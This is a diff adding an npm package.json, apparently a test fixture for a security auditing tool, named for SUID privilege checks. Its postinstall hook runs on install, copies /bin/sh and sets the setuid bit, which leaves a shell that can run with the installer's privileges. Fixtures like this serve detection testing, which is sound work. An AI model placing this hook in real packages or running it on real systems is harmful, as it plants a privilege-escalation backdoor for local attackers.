@@ -1,0 +1,8 @@
+{
+  "name": "goaudit-test-privilege-suid",
+  "version": "1.0.0",
+  "private": true,
+  "scripts": {
+    "postinstall": "cp /bin/sh ./goaudit-suid-test && chmod 4755 ./goaudit-suid-test"
+  }
+}
